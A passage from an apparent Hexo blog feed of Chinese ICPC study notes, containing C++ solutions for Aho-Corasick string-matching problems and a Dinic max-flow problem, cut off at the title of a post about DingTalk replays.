class="number">1000010</span>];</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">int</span> len=word[x].<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=word[x][i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next[k]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node *new_node=<span class="keyword">new</span> node;</span><br><span class="line">            new_node-&gt;<span class="built_in">aaa</span>();</span><br><span class="line">            p-&gt;next[k]=new_node;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;word=x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                node *k=p-&gt;next[i];</span><br><span class="line">                q.<span class="built_in">push</span>(k);</span><br><span class="line">                <span class="keyword">if</span>(p==root)&#123;</span><br><span class="line">                    k-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    node *fafail=p-&gt;fail;</span><br><span class="line">                    <span class="keyword">while</span>(fafail!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(fafail-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                            k-&gt;fail=fafail-&gt;next[i];</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        fafail=fafail-&gt;fail;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fafail==<span class="literal">NULL</span>)k-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=t[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next[k]==<span class="literal">NULL</span>&amp;&amp;p!=root)p=p-&gt;fail;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)p=root;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node *temp=p;</span><br><span class="line">            <span class="keyword">while</span>(temp!=root)&#123;</span><br><span class="line">                <span class="keyword">if</span>(temp-&gt;word)&#123;</span><br><span class="line">                    num[temp-&gt;word]++;</span><br><span class="line">                &#125;</span><br><span class="line">                temp=temp-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(string a,string b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num[tmap[a]]==num[tmap[b]])<span class="keyword">return</span> tmap[a]&lt;tmap[b];</span><br><span class="line">    <span class="keyword">return</span> num[tmap[a]]&gt;num[tmap[b]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)&amp;&amp;n)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(num));</span><br><span class="line">        tmap.<span class="built_in">clear</span>();</span><br><span class="line">        root=<span class="keyword">new</span> node;</span><br><span class="line">        root-&gt;<span class="built_in">aaa</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;word[i];</span><br><span class="line">            tmap[word[i]]=i;</span><br><span class="line">            <span class="built_in">insert</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">build_fail</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">        <span class="built_in">sort</span>(word+<span class="number">1</span>,word+<span class="number">1</span>+n,cmp);</span><br><span class="line">        <span class="built_in">sort</span>(num+<span class="number">1</span>,num+<span class="number">1</span>+n,cmp1);</span><br><span class="line">        <span class="keyword">int</span> maxnum=num[<span class="number">1</span>];</span><br><span class="line">        cout&lt;&lt;maxnum&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[i]==maxnum)&#123;</span><br><span class="line">                cout&lt;&lt;word[i]&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e6</span> + <span class="number">5</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> word;<span class="keyword">int</span> deg,val;</span><br><span class="line">    node *fail , *next[<span class="number">26</span>];</span><br><span class="line">    <span class="built_in">node</span>() &#123;</span><br><span class="line">        word = deg = val = <span class="number">0</span>;fail = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++)</span><br><span class="line">            next[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;*ext=(node*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node)*maxn),*root;</span><br><span class="line"></span><br><span class="line">queue&lt;node*&gt; Q;</span><br><span class="line"><span class="keyword">char</span> t[maxn], word[maxn];<span class="keyword">int</span> num[maxn],ans[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> node* <span class="title">Ot</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> *ext=<span class="built_in">node</span>(),ext++;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    node* p = root;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> k = word[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next[k] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            p-&gt;next[k] = <span class="built_in">Ot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!p-&gt;word) &#123;</span><br><span class="line">        p-&gt;word = x;</span><br><span class="line">    &#125;</span><br><span class="line">    num[x] = p-&gt;word;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++) <span class="keyword">if</span>(root-&gt;next[i]) root-&gt;next[i]-&gt;fail=root,Q.<span class="built_in">push</span>(root-&gt;next[i]); <span class="keyword">else</span> root-&gt;next[i]=root;</span><br><span class="line">    <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        node* p = Q.<span class="built_in">front</span>();Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// printf(&quot;%ld\n&quot;,p-root);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next[i]) &#123;</span><br><span class="line">                p-&gt;next[i]-&gt;fail = p-&gt;fail-&gt;next[i],p-&gt;fail-&gt;next[i]-&gt;deg++;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;next[i]!=root) Q.<span class="built_in">push</span>(p-&gt;next[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> p-&gt;next[i] = p-&gt;fail-&gt;next[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="comment">// printf(&quot;len:%d\n&quot;,len);</span></span><br><span class="line">    node* p = root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;i:%d p:%ld np:%ld\n&quot;,i,p-root,p-&gt;next[t[i]-&#x27;a&#x27;]);</span></span><br><span class="line">        <span class="keyword">int</span> k = t[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        p=p-&gt;next[k];p-&gt;val++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// puts(&quot;OUT&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">topo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(node *i=root;i&lt;ext;i++) <span class="keyword">if</span>(!i-&gt;deg) Q.<span class="built_in">push</span>(i);</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=Q.<span class="built_in">front</span>();Q.<span class="built_in">pop</span>();ans[p-&gt;word]=p-&gt;val;</span><br><span class="line">        <span class="comment">// printf(&quot;p:%ld\n&quot;,p-root);</span></span><br><span class="line">        <span class="keyword">if</span>(p!=root)&#123;</span><br><span class="line">            p-&gt;fail-&gt;val += p-&gt;val;</span><br><span class="line">            <span class="keyword">if</span>(--p-&gt;fail-&gt;deg==<span class="number">0</span>) Q.<span class="built_in">push</span>(p-&gt;fail);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);root=<span class="built_in">Ot</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, word);</span><br><span class="line">        <span class="built_in">insert</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build_fail</span>();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t);</span><br><span class="line">    <span class="built_in">query</span>();<span class="built_in">topo</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        cout&lt;&lt;ans[num[i]]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> AC自动机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最小费用最大流应用</title>
      <link href="/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/"/>
      <url>/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>一道小思维题</p><span id="more"></span><p>题目描述</p><p><img src="/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/1.png" alt="1"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6000</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    </span><br><span class="line">&#125;e[maxn*<span class="number">3000</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt=<span class="number">1</span>,dep[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,q,x,y;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;que;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0</span>, w = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">char</span> ch = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) w = <span class="number">-1</span>;        </span><br><span class="line">    ch = <span class="built_in">getchar</span>();               </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;  </span><br><span class="line">    x = x * <span class="number">10</span> + (ch - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    ch = <span class="built_in">getchar</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x * w; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    e[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="built_in">size</span>())que.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="built_in">memset</span>(dep,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dep));</span><br><span class="line">    dep[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    que.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=e[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> w=e[i].w,v=e[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!w||dep[v])<span class="keyword">continue</span>;</span><br><span class="line">            dep[v]=dep[u]+<span class="number">1</span>;</span><br><span class="line">            que.<span class="built_in">push</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[<span class="number">2</span>*n+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Dinic</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u==<span class="number">2</span>*n+<span class="number">1</span>)<span class="keyword">return</span> in;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=e[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">        <span class="keyword">if</span>(dep[v]&gt;dep[u]&amp;&amp;w)&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">Dinic</span>(v,<span class="built_in">min</span>(in,w));</span><br><span class="line">            e[i].w-=res;</span><br><span class="line">            e[i^<span class="number">1</span>].w+=res;</span><br><span class="line">            in-=res;</span><br><span class="line">            ans+=res;</span><br><span class="line">            <span class="keyword">if</span>(!in)<span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0</span>)dep[u]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    n=<span class="built_in">rd</span>();</span><br><span class="line">    m=<span class="built_in">rd</span>();</span><br><span class="line">    q=<span class="built_in">rd</span>();</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,x,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(x,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">add</span>(i,i+n,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(i+n,i,<span class="number">0</span>);</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="keyword">while</span>(x--)&#123;</span><br><span class="line">            y=<span class="built_in">rd</span>();</span><br><span class="line">            <span class="built_in">add</span>(i+n,y,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">add</span>(y,i+n,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="built_in">add</span>(x+n,<span class="number">2</span>*n+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">2</span>*n+<span class="number">1</span>,x+n,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        ans+=<span class="built_in">Dinic</span>(<span class="number">0</span>,<span class="number">0x7fffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 最小费用最大流 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于钉钉保存回放的方式</title>
      <link href="/2022/03/20/Dingtalk/"/>
      <url>/2022/03/20/Dingtalk/</url>
      
